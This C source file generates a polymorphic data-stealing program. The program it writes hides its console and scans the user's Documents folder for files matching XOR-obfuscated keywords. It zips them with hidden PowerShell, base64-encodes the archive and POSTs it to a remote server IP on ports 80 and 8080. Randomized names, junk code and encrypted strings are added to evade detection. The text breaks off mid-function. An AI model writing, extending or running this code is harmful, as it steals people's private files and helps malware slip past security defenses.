#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "var_rename.h"
#include "loop_vary.h"
#include "self_modify.h"
#include "junk_code.h"
#include "string_encrypt.h"
#include "dir_scan.h"
#include "func_rename.h"

unsigned int get_seed() {
    return (unsigned int)(time(NULL) ^ GetCurrentProcessId());
}

void generate_polymorphic_code(int argc, char *argv[]) {
    FILE *output = fopen("poly_attack.c", "w");
    if (!output) return;

    unsigned int seed = get_seed();
    srand(seed);

    int var_count;
    const char **vars = get_variable_names(&var_count);
    if (!vars || var_count == 0) {
        fclose(output);
        return;
    }
    int func_count;
    const char **funcs = get_function_names(&func_count, seed);
    if (!funcs || func_count == 0) {
        for (int i = 0; i < var_count; i++) if (vars[i]) free((void *)vars[i]);
        free(vars);
        fclose(output);
        return;
    }

    for (int i = 0; i < var_count; i++) {
        if (!vars[i]) {
            for (int j = 0; j < var_count; j++) if (vars[j]) free((void *)vars[j]);
            free(vars);
            for (int j = 0; j < func_count; j++) if (funcs[j]) free((void *)funcs[j]);
            free(funcs);
            fclose(output);
            return;
        }
    }
    for (int i = 0; i < func_count; i++) {
        if (!funcs[i]) {
            for (int j = 0; j < var_count; j++) if (vars[j]) free((void *)vars[j]);
            free(vars);
            for (int j = 0; j < func_count; j++) if (funcs[j]) free((void *)funcs[j]);
            free(funcs);
            fclose(output);
            return;
        }
    }

    int var_idx1 = rand() % var_count;
    int var_idx2 = rand() % var_count;
    while (var_idx2 == var_idx1) var_idx2 = rand() % var_count;
    int var_idx3 = rand() % var_count;
    while (var_idx3 == var_idx1 || var_idx3 == var_idx2) var_idx3 = rand() % var_count;
    int var_idx4 = rand() % var_count;
    while (var_idx4 == var_idx1 || var_idx4 == var_idx2 || var_idx3 == var_idx4) var_idx4 = rand() % var_count;
    int var_idx5 = rand() % var_count;
    while (var_idx5 == var_idx1 || var_idx5 == var_idx2 || var_idx5 == var_idx3 || var_idx5 == var_idx4) var_idx5 = rand() % var_count;
    int var_idx6 = rand() % var_count;
    while (var_idx6 == var_idx1 || var_idx6 == var_idx2 || var_idx6 == var_idx3 || var_idx6 == var_idx4 || var_idx6 == var_idx5) var_idx6 = rand() % var_count;
    int func_idx1 = rand() % func_count;
    int func_idx2 = rand() % func_count;
    while (func_idx2 == func_idx1) func_idx2 = rand() % func_count;
    int func_idx3 = rand() % func_count;
    while (func_idx3 == func_idx1 || func_idx3 == func_idx2) func_idx3 = rand() % func_count;
    const char *var_find_handle = vars[var_idx1];
    const char *var_find_data = vars[var_idx2];
    const char *var_out_dir = vars[var_idx3];
    const char *var_temp_buf = vars[var_idx4];
    const char *var_loop_counter = vars[var_idx5];
    const char *var_junk_counter = vars[var_idx6];
    const char *func_scan_dir = funcs[func_idx1];
    const char *func_decrypt_str = funcs[func_idx2];
    const char *func_str_contains = funcs[func_idx3];

    fprintf(output, "#ifndef _WIN32\n");
    fprintf(output, "#error This program requires a Windows environment\n");
    fprintf(output, "#endif\n");
    fprintf(output, "#include <winsock2.h>\n");
    fprintf(output, "#include <ws2tcpip.h>\n");
    fprintf(output, "#include <windows.h>\n");
    fprintf(output, "#include <stdio.h>\n");
    fprintf(output, "#include <ctype.h>\n");
    fprintf(output, "#include <string.h>\n\n");

    fprintf(output, "void %s(char *dst, const char *src, int len, unsigned char key) {\n", func_decrypt_str);
    fprintf(output, "    if (!dst || !src || len < 0) return;\n");
    fprintf(output, "    for (int i = 0; i < len && i < 255; i++) dst[i] = src[i] ^ key;\n");
    fprintf(output, "    dst[len < 255 ? len : 255] = 0;\n}\n\n");

    fprintf(output, "int %s(const char *str, const char *substr) {\n", func_str_contains);
    fprintf(output, "    if (!str || !substr) return 0;\n");
    fprintf(output, "    char *lower_str = _strdup(str);\n");
    fprintf(output, "    char *lower_substr = _strdup(substr);\n");
    fprintf(output, "    if (!lower_str || !lower_substr) { free(lower_str); free(lower_substr); return 0; }\n");
    fprintf(output, "    for (int i = 0; lower_str[i]; i++) lower_str[i] = tolower(lower_str[i]);\n");
    fprintf(output, "    for (int i = 0; lower_substr[i]; i++) lower_substr[i] = tolower(lower_substr[i]);\n");
    fprintf(output, "    int result = strstr(lower_str, lower_substr) != NULL;\n");
    fprintf(output, "    free(lower_str); free(lower_substr);\n");
    fprintf(output, "    return result;\n}\n\n");

    fprintf(output, "void %s(const char *path, HANDLE *%s, WIN32_FIND_DATAA %s, const char *%s, char *%s, int depth, int *files_copied) {\n",
            func_scan_dir, var_find_handle, var_find_data, var_out_dir, var_temp_buf);
    fprintf(output, "    if (depth > 5 || !path || !%s || !%s || !%s || !files_copied) return;\n", var_find_handle, var_out_dir, var_temp_buf);
    fprintf(output, "    DWORD start_time = GetTickCount();\n");
    fprintf(output, "    char search_path[256];\n");
    fprintf(output, "    if (snprintf(search_path, sizeof(search_path), \"%%s\\\\*\", path) >= sizeof(search_path)) {\n");
    fprintf(output, "        FILE *log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Path buffer overflow for %%s\\n\", path); fclose(log); }\n");
    fprintf(output, "        return;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    *%s = FindFirstFileA(search_path, &%s);\n", var_find_handle, var_find_data);
    fprintf(output, "    if (*%s == INVALID_HANDLE_VALUE) {\n", var_find_handle);
    fprintf(output, "        FILE *log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"FindFirstFileA failed for %%s: %%lu\\n\", path, GetLastError()); fclose(log); }\n");
    fprintf(output, "        return;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    const char keyword1_enc[] = {0x73, 0x5f, 0x5e, 0x56, 0x59, 0x54, 0x55, 0x5e, 0x44, 0x59, 0x51, 0x5c};\n");
    fprintf(output, "    char keyword1[13];\n");
    fprintf(output, "    %s(keyword1, keyword1_enc, 12, 48);\n", func_decrypt_str);
    fprintf(output, "    const char keyword2_enc[] = {0x3a, 0x0d, 0x0b, 0x11, 0x16, 0x1d, 0x0b, 0x0b, 0x58, 0x37, 0x08, 0x1d, 0x0a, 0x19, 0x0c, 0x11, 0x17, 0x16, 0x0b};\n");
    fprintf(output, "    char keyword2[20];\n");
    fprintf(output, "    %s(keyword2, keyword2_enc, 19, 120);\n", func_decrypt_str);
    fprintf(output, "    int is_target_folder = %s(path, keyword1) || %s(path, keyword2);\n", func_str_contains, func_str_contains);
    fprintf(output, "    FILE *log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Scanning folder: %%s\\n\", path); fclose(log); }\n");
    fprintf(output, "    do {\n");
    fprintf(output, "        if (%s.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n", var_find_data);
    fprintf(output, "            if (strcmp(%s.cFileName, \".\") == 0 || strcmp(%s.cFileName, \"..\") == 0) continue;\n", var_find_data, var_find_data);
    fprintf(output, "            if (%s.dwFileAttributes & (FILE_ATTRIBUTE_REPARSE_POINT | FILE_ATTRIBUTE_SYSTEM)) continue;\n", var_find_data);
    fprintf(output, "            if (snprintf(%s, 256, \"%%s\\\\%%s\", path, %s.cFileName) >= 256) continue;\n", var_temp_buf, var_find_data);
    fprintf(output, "            HANDLE file_handle_2;\n");
    fprintf(output, "            %s(%s, &file_handle_2, %s, %s, %s, depth + 1, files_copied);\n", func_scan_dir, var_temp_buf, var_find_data, var_out_dir, var_temp_buf);
    fprintf(output, "        } else if (is_target_folder || %s(%s.cFileName, keyword1) || %s(%s.cFileName, keyword2)) {\n", func_str_contains, var_find_data, func_str_contains, var_find_data);
    fprintf(output, "            char src_path[256], dst_path[256];\n");
    fprintf(output, "            if (snprintf(src_path, sizeof(src_path), \"%%s\\\\%%s\", path, %s.cFileName) >= sizeof(src_path) ||\n", var_find_data);
    fprintf(output, "                snprintf(dst_path, sizeof(dst_path), \"%%s\\\\%%s\", %s, %s.cFileName) >= sizeof(dst_path)) {\n", var_out_dir, var_find_data);
    fprintf(output, "                log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                if (log) { fprintf(log, \"Path buffer overflow for %%s\\n\", %s.cFileName); fclose(log); }\n", var_find_data);
    fprintf(output, "                continue;\n");
    fprintf(output, "            }\n");
    fprintf(output, "            if (CopyFileA(src_path, dst_path, FALSE)) {\n");
    fprintf(output, "                (*files_copied)++;\n");
    fprintf(output, "                log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                if (log) { fprintf(log, \"Copied file: %%s\\n\", src_path); fclose(log); }\n");
    fprintf(output, "            } else {\n");
    fprintf(output, "                log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                if (log) { fprintf(log, \"Failed to copy %%s: %%lu\\n\", src_path, GetLastError()); fclose(log); }\n");
    fprintf(output, "            }\n");
    fprintf(output, "        } else {\n");
    fprintf(output, "            log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "            if (log) { fprintf(log, \"Skipped file: %%s\\\\%%s\\n\", path, %s.cFileName); fclose(log); }\n", var_find_data);
    fprintf(output, "        }\n");
    fprintf(output, "    } while (FindNextFileA(*%s, &%s));\n", var_find_handle, var_find_data);
    fprintf(output, "    FindClose(*%s);\n", var_find_handle);
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Scanning %%s took %%lu ms\\n\", path, GetTickCount() - start_time); fclose(log); }\n");
    fprintf(output, "}\n\n");

    fprintf(output, "int main(int argc, char *argv[]) {\n");
    fprintf(output, "    FreeConsole();\n");
    fprintf(output, "    DWORD prog_start_time = GetTickCount();\n");
    fprintf(output, "    volatile int %s = %d;\n", var_junk_counter, rand() % 100);
    write_junk_code(output, seed + 1);

    const char *out_dir = "C:\\Users\\Public\\Downloads\\Downloads";
    unsigned char key = (unsigned char)(rand() % 256);
    fprintf(output, "    const char %s_enc[] = {", var_out_dir);
    for (int i = 0; i < strlen(out_dir); i++) {
        fprintf(output, "0x%02x", (unsigned char)(out_dir[i] ^ key));
        if (i < strlen(out_dir) - 1) fprintf(output, ", ");
    }
    fprintf(output, "};\n");
    fprintf(output, "    char %s[36];\n", var_out_dir);
    fprintf(output, "    %s(%s, %s_enc, %d, %d);\n", func_decrypt_str, var_out_dir, var_out_dir, (int)strlen(out_dir), key);
    fprintf(output, "    if (!CreateDirectoryA(%s, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {\n", var_out_dir);
    fprintf(output, "        char temp_dir[36];\n");
    fprintf(output, "        GetTempPathA(sizeof(temp_dir), temp_dir);\n");
    fprintf(output, "        if (snprintf(%s, sizeof(%s), \"%%sPolyDownloads\", temp_dir) >= sizeof(%s)) {\n", var_out_dir, var_out_dir, var_out_dir);
    fprintf(output, "            FILE *log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "            if (log) { fprintf(log, \"Output directory buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "            return 1;\n");
    fprintf(output, "        }\n");
    fprintf(output, "        CreateDirectoryA(%s, NULL);\n", var_out_dir);
    fprintf(output, "    }\n");
    fprintf(output, "    FILE *log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Directory created: %%s\\n\", %s); fclose(log); }\n", var_out_dir);

    fprintf(output, "    HANDLE %s;\n", var_find_handle);
    fprintf(output, "    WIN32_FIND_DATAA %s;\n", var_find_data);
    fprintf(output, "    char %s[256];\n", var_temp_buf);
    fprintf(output, "    char username[256];\n");
    fprintf(output, "    DWORD username_len = sizeof(username);\n");
    fprintf(output, "    GetEnvironmentVariableA(\"USERNAME\", username, username_len);\n");
    fprintf(output, "    char root_path[256];\n");
    fprintf(output, "    if (snprintf(root_path, sizeof(root_path), \"C:\\\\Users\\\\%%s\\\\Documents\", username) >= sizeof(root_path)) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Root path buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "        return 1;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    %s += %d;\n", var_junk_counter, rand() % 50);
    write_junk_code(output, seed + 2);
    fprintf(output, "    int files_copied = 0;\n");
    fprintf(output, "    DWORD scan_start_time = GetTickCount();\n");
    fprintf(output, "    %s(root_path, &%s, %s, %s, %s, 0, &files_copied);\n", func_scan_dir, var_find_handle, var_find_data, var_out_dir, var_temp_buf);
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Directory scan completed, %%d files copied, took %%lu ms\\n\", files_copied, GetTickCount() - scan_start_time); fclose(log); }\n");
    fprintf(output, "    if (files_copied == 0) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"No files copied, skipping exfiltration\\n\"); fclose(log); }\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");

    fprintf(output, "    char temp_path[256];\n");
    fprintf(output, "    GetTempPathA(sizeof(temp_path), temp_path);\n");
    fprintf(output, "    char zip_path[256];\n");
    fprintf(output, "    if (snprintf(zip_path, sizeof(zip_path), \"%%sarchive.zip\", temp_path) >= sizeof(zip_path)) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Zip path buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    char zip_cmd[512];\n");
    fprintf(output, "    if (snprintf(zip_cmd, sizeof(zip_cmd), \"-Command \\\"Compress-Archive -Path '%%s\\\\*' -DestinationPath '%%s' -Force\\\"\", %s, zip_path) >= sizeof(zip_cmd)) {\n", var_out_dir);
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Zip command buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    DWORD zip_start_time = GetTickCount();\n");
    fprintf(output, "    if (ShellExecuteA(NULL, \"open\", \"powershell.exe\", zip_cmd, NULL, SW_HIDE) <= (HINSTANCE)32) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"PowerShell zipping failed, attempting individual copy\\n\"); fclose(log); }\n");
    fprintf(output, "        WIN32_FIND_DATAA find_data;\n");
    fprintf(output, "        char search_path[256];\n");
    fprintf(output, "        if (snprintf(search_path, sizeof(search_path), \"%%s\\\\*\", %s) >= sizeof(search_path)) {\n", var_out_dir);
    fprintf(output, "            log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "            if (log) { fprintf(log, \"Search path buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "            goto cleanup;\n");
    fprintf(output, "        }\n");
    fprintf(output, "        HANDLE hFind = FindFirstFileA(search_path, &find_data);\n");
    fprintf(output, "        if (hFind != INVALID_HANDLE_VALUE) {\n");
    fprintf(output, "            do {\n");
    fprintf(output, "                if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;\n");
    fprintf(output, "                char src_path[256], dst_path[256];\n");
    fprintf(output, "                if (snprintf(src_path, sizeof(src_path), \"%%s\\\\%%s\", %s, find_data.cFileName) >= sizeof(src_path) ||\n", var_out_dir);
    fprintf(output, "                    snprintf(dst_path, sizeof(dst_path), \"%%sarchive_%%s\", temp_path, find_data.cFileName) >= sizeof(dst_path)) {\n");
    fprintf(output, "                    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                    if (log) { fprintf(log, \"Fallback path buffer overflow for %%s\\n\", find_data.cFileName); fclose(log); }\n");
    fprintf(output, "                    continue;\n");
    fprintf(output, "                }\n");
    fprintf(output, "                if (CopyFileA(src_path, dst_path, FALSE)) {\n");
    fprintf(output, "                    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                    if (log) { fprintf(log, \"Fallback copied: %%s\\n\", dst_path); fclose(log); }\n");
    fprintf(output, "                }\n");
    fprintf(output, "            } while (FindNextFileA(hFind, &find_data));\n");
    fprintf(output, "            FindClose(hFind);\n");
    fprintf(output, "        } else {\n");
    fprintf(output, "            log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "            if (log) { fprintf(log, \"FindFirstFileA failed for zipping fallback: %%lu\\n\", GetLastError()); fclose(log); }\n");
    fprintf(output, "        }\n");
    fprintf(output, "    } else {\n");
    fprintf(output, "        Sleep(2000);\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Zipping succeeded: %%s, took %%lu ms\\n\", zip_path, GetTickCount() - zip_start_time); fclose(log); }\n");
    fprintf(output, "    }\n");

    fprintf(output, "    WSADATA wsa;\nSOCKET s = INVALID_SOCKET;\nstruct sockaddr_in server;\nchar *b64 = NULL;\n");
    fprintf(output, "    HANDLE hFile = INVALID_HANDLE_VALUE;\n");
    fprintf(output, "    DWORD exfil_start_time = GetTickCount();\n");
    fprintf(output, "    for (int retry = 0; retry < 5; retry++) {\n");
    fprintf(output, "        hFile = CreateFileA(zip_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(output, "        if (hFile != INVALID_HANDLE_VALUE) break;\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to open %%s (attempt %%d): %%lu\\n\", zip_path, retry + 1, GetLastError()); fclose(log); }\n");
    fprintf(output, "        Sleep(2000);\n");
    fprintf(output, "    }\n");
    fprintf(output, "    if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to open %%s after retries: %%lu\\n\", zip_path, GetLastError()); fclose(log); }\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    DWORD file_size = GetFileSize(hFile, NULL);\n");
    fprintf(output, "    if (file_size == INVALID_FILE_SIZE || file_size == 0) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Invalid or empty %%s size: %%lu\\n\", zip_path, file_size); fclose(log); }\n");
    fprintf(output, "        CloseHandle(hFile);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    char *buf = malloc(file_size);\n");
    fprintf(output, "    if (!buf) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to allocate memory for %%s\\n\", zip_path); fclose(log); }\n");
    fprintf(output, "        CloseHandle(hFile);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    DWORD read;\n");
    fprintf(output, "    if (!ReadFile(hFile, buf, file_size, &read, NULL) || read != file_size) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to read %%s: %%lu\\n\", zip_path, GetLastError()); fclose(log); }\n");
    fprintf(output, "        free(buf);\n");
    fprintf(output, "        CloseHandle(hFile);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    CloseHandle(hFile);\n");
    fprintf(output, "    const char b64_chars[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n");
    fprintf(output, "    int b64_len = ((file_size + 2) / 3) * 4 + 1;\n");
    fprintf(output, "    b64 = malloc(b64_len);\n");
    fprintf(output, "    if (!b64) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to allocate memory for b64\\n\"); fclose(log); }\n");
    fprintf(output, "        free(buf);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    int j = 0;\n");
    fprintf(output, "    for (int i = 0; i < file_size; i += 3) {\n");
    fprintf(output, "        int a = (unsigned char)buf[i];\n");
    fprintf(output, "        int b = i + 1 < file_size ? (unsigned char)buf[i + 1] : 0;\n");
    fprintf(output, "        int c = i + 2 < file_size ? (unsigned char)buf[i + 2] : 0;\n");
    fprintf(output, "        b64[j++] = b64_chars[(a >> 2) & 0x3F];\n");
    fprintf(output, "        b64[j++] = b64_chars[((a << 4) & 0x30) | ((b >> 4) & 0x0F)];\n");
    fprintf(output, "        b64[j++] = i + 1 < file_size ? b64_chars[((b << 2) & 0x3C) | ((c >> 6) & 0x03)] : '=';\n");
    fprintf(output, "        b64[j++] = i + 2 < file_size ? b64_chars[c & 0x3F] : '=';\n");
    fprintf(output, "    }\n");
    fprintf(output, "    b64[j] = 0;\nfree(buf);\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Base64 encoding completed\\n\"); fclose(log); }\n");

    fprintf(output, "    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"WSAStartup failed: %%d\\n\", WSAGetLastError()); fclose(log); }\n");
    fprintf(output, "        goto alt_exfil;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    int http_success = 0;\n");
    fprintf(output, "    for (int port = 80; port <= 8080; port += port == 80 ? 7988 : 0) {\n");
    fprintf(output, "        for (int retry = 0; retry < 3; retry++) {\n");
    fprintf(output, "            s = socket(AF_INET, SOCK_STREAM, 0);\n");
    fprintf(output, "            if (s == INVALID_SOCKET) {\n");
    fprintf(output, "                log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "                if (log) { fprintf(log, \"Socket creation failed: %%d\\n\", WSAGetLastError()); fclose(log); }\n");
    fprintf(output, "                Sleep(1000);\n");
    fprintf(output, "                continue;\n");
    fprintf(output, "            }\n");
    fprintf(output, "            int timeout = 5000;\n");
    fprintf(output, "            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));\n");
    fprintf(output, "            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));\n");
    fprintf(output, "            server.sin_family = AF_INET;\n");
    const char *server_ip = (argc > 1 && argv[1] && strlen(argv[1]) > 0) ? argv[1] : "192.168.1.7";
    key = 236;
    fprintf(output, "            const char server_ip_enc[] = {");
    for (int i = 0; i < strlen(server_ip); i++) {
        fprintf(output, "0x%02x", (unsigned char)(server_ip[i] ^ key));
        if (i < strlen(server_ip) - 1) fprintf(output, ", ");
    }
    fprintf(output, "};\n");
    fprintf(output, "    char server_ip[16];\n");
    fprintf(output, "    %s(server_ip, server_ip_enc, %d, %d);\n", func_decrypt_str, (int)strlen(server_ip), key);
    fprintf(output, "    if (strcmp(server_ip, \"%s\") != 0) {\n", server_ip);
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Invalid server IP: %%s\\n\", server_ip); fclose(log); }\n");
    fprintf(output, "        closesocket(s);\n");
    fprintf(output, "        continue;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    server.sin_addr.s_addr = inet_addr(server_ip);\n");
    fprintf(output, "    server.sin_port = htons(port);\n");
    fprintf(output, "    if (connect(s, (struct sockaddr*)&server, sizeof(server)) != 0) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Connect failed to %%s:%%d: %%d\\n\", server_ip, port, WSAGetLastError()); fclose(log); }\n");
    fprintf(output, "        closesocket(s);\n");
    fprintf(output, "        s = INVALID_SOCKET;\n");
    fprintf(output, "        Sleep(1000);\n");
    fprintf(output, "        continue;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    char req[16384];\n");
    fprintf(output, "    if (snprintf(req, sizeof(req), \"POST /upload HTTP/1.1\\r\\nHost: %%s:%%d\\r\\nContent-Type: application/octet-stream\\r\\nContent-Length: %%d\\r\\nConnection: close\\r\\n\\r\\n%%s\", server_ip, port, b64_len - 1, b64) >= sizeof(req)) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"HTTP request buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "        closesocket(s);\n");
    fprintf(output, "        s = INVALID_SOCKET;\n");
    fprintf(output, "        continue;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    int sent = send(s, req, strlen(req), 0);\n");
    fprintf(output, "    if (sent == SOCKET_ERROR) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Send failed: %%d\\n\", WSAGetLastError()); fclose(log); }\n");
    fprintf(output, "        closesocket(s);\n");
    fprintf(output, "        s = INVALID_SOCKET;\n");
    fprintf(output, "        Sleep(1000);\n");
    fprintf(output, "        continue;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    char resp[1024] = {0};\n");
    fprintf(output, "    int received = recv(s, resp, sizeof(resp) - 1, 0);\n");
    fprintf(output, "    if (received > 0 && strstr(resp, \"200 OK\")) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"HTTP succeeded on port %%d\\n\", port); fclose(log); }\n");
    fprintf(output, "        http_success = 1;\n");
    fprintf(output, "        closesocket(s);\n");
    fprintf(output, "        break;\n");
    fprintf(output, "    } else {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"HTTP failed, no 200 OK on port %%d\\n\", port); fclose(log); }\n");
    fprintf(output, "    }\n");
    fprintf(output, "    closesocket(s);\n");
    fprintf(output, "    s = INVALID_SOCKET;\n");
    fprintf(output, "    Sleep(1000);\n");
    fprintf(output, "    }\n");
    fprintf(output, "    if (http_success) break;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    WSACleanup();\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Exfiltration took %%lu ms\\n\", GetTickCount() - exfil_start_time); fclose(log); }\n");
    fprintf(output, "    if (http_success) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"HTTP exfiltration completed\\n\"); fclose(log); }\n");
    fprintf(output, "        free(b64);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "alt_exfil:\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Attempting fallback exfiltration\\n\"); fclose(log); }\n");
    fprintf(output, "    char fallback_path[256];\n");
    fprintf(output, "    if (snprintf(fallback_path, sizeof(fallback_path), \"%%s.data.txt\", temp_path) >= sizeof(fallback_path)) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Fallback path buffer overflow\\n\"); fclose(log); }\n");
    fprintf(output, "        free(b64);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    HANDLE hOut = CreateFileA(fallback_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);\n");
    fprintf(output, "    if (hOut == INVALID_HANDLE_VALUE) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "        if (log) { fprintf(log, \"Failed to create %%s: %%lu\\n\", fallback_path, GetLastError()); fclose(log); }\n");
    fprintf(output, "        free(b64);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    DWORD written;\n");
    fprintf(output, "    if (!WriteFile(hOut, b64, b64_len - 1, &written, NULL)) {\n");
    fprintf(output, "        log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
